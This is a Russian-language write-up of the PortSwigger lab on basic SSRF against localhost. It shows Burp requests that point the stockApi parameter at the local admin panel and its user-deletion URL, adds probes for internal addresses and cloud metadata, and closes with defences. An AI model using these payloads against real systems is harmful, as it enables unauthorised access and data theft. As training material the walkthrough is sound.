# 📘 PortSwigger Lab: Basic SSRF against the local server

<a id="top"></a>

> 🔗 Лабораторная работа: https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-localhost  
> 🎯 Тема: Server-Side Request Forgery (SSRF) — атака против самого сервера  
> 🧪 Уровень: Apprentice  
> ✅ Статус: Solved  

---

## 📑 Содержание

- [🎯 Цель](#goal)
- [🧠 Краткая теория](#theory)
- [🧩 Ключевая идея](#idea)
- [🔗 Что такое SSRF](#ssrf)
- [🤝 Отношения доверия (trust relationships)](#trust)
- [🏠 Почему `localhost` особенный](#localhost)
- [🛒 Как работает проверка наличия товара](#stock-check)
- [❌ Уязвимая логика](#vulnerable-flow)
- [🔍 Шаг 1 — Убедиться, что `/admin` недоступен напрямую](#step1)
- [🔍 Шаг 2 — Перехватить запрос проверки наличия](#step2)
- [🔍 Шаг 3 — Отправить запрос в Repeater](#step3)
- [🔍 Шаг 4 — Заменить URL в `stockApi` на `http://localhost/admin`](#step4)
- [🔍 Шаг 5 — Найти URL удаления пользователя](#step5)
- [🔍 Шаг 6 — Удалить пользователя `carlos`](#step6)
- [📨 Пример исходного запроса](#original-request)
- [📨 Пример модифицированного запроса](#modified-request)
- [📥 Пример результата](#response)
- [🧾 Полная цепочка атаки](#attack-chain)
- [🔬 Почему атака сработала](#breakdown)
- [🧠 Как думать как пентестер](#pentester)
- [🧪 Дополнительные проверки](#additional-tests)
- [❌ Типичные ошибки](#mistakes)
- [🛡 Защита](#defense)
- [✅ Чек-лист](#checklist)
- [🧾 Итог](#conclusion)

---

<a id="goal"></a>

## 🎯 Цель

В лаборатории есть функция проверки наличия товара (stock check), которая загружает данные из внутренней системы.

Требуется:

```text
1. Использовать SSRF-уязвимость в параметре stockApi.
2. Получить доступ к административному интерфейсу:

   http://localhost/admin

3. Удалить пользователя carlos.
```

---

<a id="theory"></a>

## 🧠 Краткая теория

**SSRF (Server-Side Request Forgery)** — уязвимость, при которой атакующий заставляет **сервер** отправить HTTP-запрос по URL, контролируемому атакующим.

В этой лабе параметр:

```text
stockApi
```

принимает **полный URL** внутреннего API, к которому сервер обращается от своего имени. Атакующий подменяет URL на:

```text
http://localhost/admin
```

Сервер сам идёт на свою админку «изнутри», и контроль доступа, который блокирует внешних пользователей, пропускает запрос — потому что он выглядит как запрос от доверенной локальной машины.

---

<a id="idea"></a>

## 🧩 Ключевая идея

Уязвимость строится на двух фактах:

```text
1. Сервер доверяет пользователю выбирать URL для внутреннего запроса.
2. Админ-интерфейс доверяет запросам, которые приходят с localhost.
```

Цепочка:

```text
Атакующий ──(stockApi=http://localhost/admin)──> Сервер
                                                    │
                                                    ▼
                                     Сервер ──(GET /admin)──> localhost
                                                    │
                                                    ▼
                                    Ответ админки возвращается атакующему
```

---

<a id="ssrf"></a>

## 🔗 Что такое SSRF

SSRF — это когда приложение по воле атакующего делает запросы **не туда**, куда задумано.

Типичные сценарии:

- запрос к **самому серверу** через loopback (`localhost`, `127.0.0.1`);
- запрос к **внутренним бэкендам** в приватных сетях (`10.x.x.x`, `172.16-31.x.x`, `192.168.x.x`);
- запрос к **облачным метаданным** (`http://169.254.169.254/latest/meta-data/`);
- запрос к **внешним** системам от имени организации.

Причина всегда одна: **приложение доверяет пользовательскому вводу как адресу ресурса** и не проверяет, куда реально уходит запрос.

---

<a id="trust"></a>

## 🤝 Отношения доверия (trust relationships)

SSRF эксплуатирует **слои доверия** в архитектуре:

- приложение доверяет пользователю и подставляет его URL в свой запрос;
- внутренние сервисы доверяют запросам, приходящим от приложения;
- админка доверяет запросам с localhost.

Атакующий использует сервер как **прокси**, который проходит сквозь слои защиты, недоступные напрямую:

```text
Атакующий ──✗──> /admin (блокируется контролем доступа)

Атакующий ──(SSRF)──> Приложение ──(запрос от своего имени)──> /admin ✅
```

---

<a id="localhost"></a>

## 🏠 Почему `localhost` особенный

`localhost` / `127.0.0.1` — это **loopback-интерфейс** самой машины.

Запрос на `http://localhost/admin` не покидает сервер: приложение обращается к самому себе.

Почему админка вообще слушается локально:

- контроль доступа реализован во **внешнем компоненте** (reverse proxy/WAF), а loopback-запрос идёт мимо него;
- для **восстановления после сбоев** админ может заходить без пароля только с локальной машины;
- админ-интерфейс слушает **другой порт/интерфейс**, недоступный снаружи.

Результат: запрос «изнутри» обходит проверки, рассчитанные на внешних пользователей.

---

<a id="stock-check"></a>

## 🛒 Как работает проверка наличия товара

Магазин показывает, есть ли товар на складе. Для этого фронтенд передаёт серверу URL внутреннего API:

```text
POST /product/stock
stockApi=http://stock.weliketoshop.net:8080/product/stock/check?productId=6&storeId=1
```

Сервер делает запрос по этому URL, получает ответ и возвращает его пользователю.

Параметр:

```text
stockApi
```

— это и есть точка входа для SSRF: пользователь контролирует **весь URL** запроса.

---

<a id="vulnerable-flow"></a>

## ❌ Уязвимая логика

Упрощённо:

```python
stock_api = request.form["stockApi"]
response = http_client.get(stock_api)   # никакой валидации URL
return response.body
```

Проблемы:

```text
1. URL берётся из пользовательского ввода без проверки.
2. Нет ограничения на схему (http/https).
3. Нет блокировки loopback/приватных адресов.
4. Ответ внутреннего запроса возвращается пользователю.
```

---

<a id="step1"></a>

## 🔍 Шаг 1 — Убедиться, что `/admin` недоступен напрямую

В браузере открыть:

```text
https://LAB-ID.web-security-academy.net/admin
```

Ожидаемый результат:

```text
Access denied
```

или редирект — прямой доступ к админке заблокирован.

Вывод: админ-функции существуют, но защищены контролем доступа для внешних запросов.

Вопрос пентестера:

```text
Что будет, если запрос придёт не от браузера пользователя,
а от самого сервера?
```

---

<a id="step2"></a>

## 🔍 Шаг 2 — Перехватить запрос проверки наличия

1. Открыть страницу любого товара.
2. Запустить Burp Suite и включить перехват (Intercept on).
3. Нажать кнопку:

```text
Check stock
```

4. В Burp Proxy перехватывается запрос:

```http
POST /product/stock HTTP/1.1
Host: LAB-ID.web-security-academy.net
Cookie: session=...
Content-Type: application/x-www-form-urlencoded
Content-Length: 107

stockApi=http://192.168.0.1:8080/product/stock/check?productId=1&storeId=1
```

Главный объект тестирования:

```text
stockApi=http://192.168.0.1:8080/product/stock/check?productId=1&storeId=1
```

---

<a id="step3"></a>

## 🔍 Шаг 3 — Отправить запрос в Repeater

В Burp Proxy выполнить:

```text
Right click → Send to Repeater
```

Перейти во вкладку:

```text
Repeater
```

Repeater позволит:

- менять значение `stockApi`;
- отправлять запрос многократно;
- анализировать статус и тело ответа.

---

<a id="step4"></a>

## 🔍 Шаг 4 — Заменить URL в `stockApi` на `http://localhost/admin`

Заменить значение параметра:

```text
stockApi=http://192.168.0.1:8080/product/stock/check?productId=1&storeId=1
```

на:

```text
stockApi=http://localhost/admin
```

Запрос:

```http
POST /product/stock HTTP/1.1
Host: LAB-ID.web-security-academy.net
Cookie: session=...
Content-Type: application/x-www-form-urlencoded
Content-Length: 36

stockApi=http://localhost/admin
```

Нажать:

```text
Send
```

В ответе возвращается **административный интерфейс**: сервер сходил на `http://localhost/admin` от своего имени и вернул HTML пользователю.

---

<a id="step5"></a>

## 🔍 Шаг 5 — Найти URL удаления пользователя

Прочитать HTML в теле ответа и найти ссылку/форму удаления пользователя.

В админке есть функционал удаления:

```text
http://localhost/admin/delete?username=carlos
```

Это и есть целевой URL для финального запроса.

---

<a id="step6"></a>

## 🔍 Шаг 6 — Удалить пользователя `carlos`

Заменить `stockApi` на URL удаления:

```text
stockApi=http://localhost/admin/delete?username=carlos
```

Запрос:

```http
POST /product/stock HTTP/1.1
Host: LAB-ID.web-security-academy.net
Cookie: session=...
Content-Type: application/x-www-form-urlencoded
Content-Length: 62

stockApi=http://localhost/admin/delete?username=carlos
```

После успешной отправки:

```text
✅ Лаборатория решена (Solved)
```

Пользователь `carlos` удалён через SSRF.

---

<a id="original-request"></a>

## 📨 Пример исходного запроса

```http
POST /product/stock HTTP/1.1
Host: LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION-COOKIE
Content-Type: application/x-www-form-urlencoded
Content-Length: 107

stockApi=http://192.168.0.1:8080/product/stock/check?productId=1&storeId=1
```

Клиент контролирует значение `stockApi` — полный URL внутреннего API.

---

<a id="modified-request"></a>

## 📨 Пример модифицированного запроса

### Запрос 1 — доступ к админке

```http
POST /product/stock HTTP/1.1
Host: LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION-COOKIE
Content-Type: application/x-www-form-urlencoded
Content-Length: 36

stockApi=http://localhost/admin
```

### Запрос 2 — удаление пользователя

```http
POST /product/stock HTTP/1.1
Host: LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION-COOKIE
Content-Type: application/x-www-form-urlencoded
Content-Length: 62

stockApi=http://localhost/admin/delete?username=carlos
```

---

<a id="response"></a>

## 📥 Пример результата

### Ответ на запрос 1

```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
...

<!DOCTYPE html>
<html>
...
<h1>Users</h1>
<div>
    <span>carlos - </span>
    <a href="/admin/delete?username=carlos">Delete</a>
</div>
...
```

Важно: HTML содержит ссылку на удаление пользователя — из неё берётся финальный URL.

### Ответ на запрос 2

```http
HTTP/1.1 200 OK
...
```

и статус лаборатории меняется на:

```text
Solved
```

---

<a id="attack-chain"></a>

## 🧾 Полная цепочка атаки

```text
1. Открыть лабораторию
2. Проверить /admin напрямую — доступ запрещён
3. Открыть страницу товара
4. Включить перехват в Burp Proxy
5. Нажать "Check stock" и перехватить POST /product/stock
6. Отправить запрос в Repeater
7. Заменить stockApi на http://localhost/admin
8. Отправить — админ-интерфейс в теле ответа
9. Найти URL удаления: /admin/delete?username=carlos
10. Заменить stockApi на http://localhost/admin/delete?username=carlos
11. Отправить — пользователь carlos удалён
12. Лаборатория помечена как Solved
```

---

<a id="breakdown"></a>

## 🔬 Почему атака сработала

### 1. Пользователь контролирует полный URL

Параметр `stockApi` принимает произвольный URL без валидации.

### 2. Запрос выполняется сервером, а не браузером

Сервер обращается к `http://localhost/admin` **со своей сетевой позиции**.

### 3. Доверие к loopback-адресу

Админка не проверяет авторизацию для запросов, приходящих с localhost — считает их доверенными.

### 4. Контроль доступа стоит «снаружи»

Внешний компонент блокирует пользователя, но не может заблокировать запрос, который приложение делает само себе.

### 5. Ответ возвращается атакующему

SSRF не слепой: содержимое админки приходит в HTTP-ответе, поэтому эксплуатация тривиальна.

---

<a id="pentester"></a>

## 🧠 Как думать как пентестер

Когда видишь параметр с URL или его частью, задавай вопросы:

```text
Кто выполняет запрос — браузер или сервер?
```

```text
Контролирую ли я весь URL или только его часть?
```

```text
Возвращается ли ответ внутреннего запроса мне?
```

```text
Есть ли внутренние сервисы, которым можно попробовать localhost,
127.0.0.1, 169.254.169.254, приватные адреса?
```

Признаки SSRF-точки:

```text
stockApi   url    path   dest   redirect   uri
load       src    link   next   image_url  callback
```

---

<a id="additional-tests"></a>

## 🧪 Дополнительные проверки

В рамках разрешённой лаборатории можно сравнить:

### Прямой доступ (блокируется)

```text
GET /admin
```

### SSRF на localhost (работает)

```text
stockApi=http://localhost/admin
```

### SSRF через IP loopback

```text
stockApi=http://127.0.0.1/admin
```

### SSRF на внутренний адрес

```text
stockApi=http://192.168.0.68/admin
```

### SSRF на облачные метаданные (в реальных системах)

```text
stockApi=http://169.254.169.254/latest/meta-data/
```

Рабочее решение для данной лабы:

```text
stockApi=http://localhost/admin/delete?username=carlos
```

---

<a id="mistakes"></a>

## ❌ Типичные ошибки

### Ошибка 1. Пытаться открыть `/admin` напрямую

Прямой доступ блокируется — нужен запрос «от имени сервера».

### Ошибка 2. Менять не тот параметр

Менять нужно `stockApi`, а не `productId` или `storeId`.

### Ошибка 3. Пытаться удалить пользователя без доступа к админке

Сначала получи админ-интерфейс, прочитай HTML и найди корректный URL удаления.

### Ошибка 4. Использовать `https://localhost/admin`

Сервер слушает админку по HTTP — схема должна совпадать.

### Ошибка 5. Не перехватывать запрос

Запрос `POST /product/stock` уходит только при нажатии «Check stock» — его нужно перехватить в Burp Proxy.

### Ошибка 6. Смотреть только на статус-код

Успех определяется содержимым тела ответа (HTML админки), а не только `200 OK`.

---

<a id="defense"></a>

## 🛡 Защита

### 1. Не принимать URL от пользователя

Использовать серверный allowlist внутренних эндпоинтов:

```python
allowed_apis = {
    "stock": "http://internal-stock-api:8080/check",
}
api = allowed_apis[user_input]
```

### 2. Валидировать URL

Проверять:

```text
- схема только http/https
- отсутствие логина/пароля в URL
- hostname не из приватных диапазонов
```

### 3. Блокировать приватные адреса

```text
127.0.0.0/8        loopback
10.0.0.0/8         приватные
172.16.0.0/12      приватные
192.168.0.0/16     приватные
169.254.169.254    облачные метаданные
```

### 4. Защита от DNS rebinding

Резолвить hostname, проверять IP, затем выполнять запрос именно на этот IP.

### 5. Аутентифицировать внутренние сервисы

Админка и бэкенды не должны доверять запросам только потому, что они приходят «изнутри».

### 6. Сегментация сети

Ограничить, куда приложение может ходить (network policy / egress filtering).

### 7. Логировать исходящие запросы

Фиксировать URL, по которым ходит сервер, — поможет обнаружить злоупотребление.

---

<a id="checklist"></a>

## ✅ Чек-лист

### Разведка

- [ ] Проверен прямой доступ к `/admin` — заблокирован
- [ ] Открыта страница товара
- [ ] Перехвачен запрос `POST /product/stock`
- [ ] Найден параметр `stockApi`
- [ ] Запрос отправлен в Repeater

### Эксплуатация

- [ ] `stockApi` заменён на `http://localhost/admin`
- [ ] В ответе получен админ-интерфейс
- [ ] Найден URL удаления: `/admin/delete?username=carlos`
- [ ] `stockApi` заменён на `http://localhost/admin/delete?username=carlos`
- [ ] Пользователь `carlos` удалён
- [ ] Лаборатория получила статус Solved

---

<a id="conclusion"></a>

## 🧾 Итог

Лаборатория решена через классический SSRF-сценарий «против самого сервера»:

```text
stockApi=http://localhost/admin
```

Сервер выполнил запрос к собственной админке от своего имени, обойдя контроль доступа, рассчитанный на внешних пользователей. Затем через:

```text
stockApi=http://localhost/admin/delete?username=carlos
```

пользователь `carlos` был удалён.

Главные выводы:

```text
SSRF — это злоупотребление доверием: приложение доверяет вводу,
внутренние сервисы доверяют источнику запроса.
```

```text
Loopback и приватные адреса должны блокироваться на стороне сервера.
```

```text
Внутренние интерфейсы должны требовать аутентификацию независимо от источника запроса.
```

```text
Пользовательский ввод не должен управлять исходящими URL без строгой валидации.
```

---

[⬆ Вернуться к началу](#top)
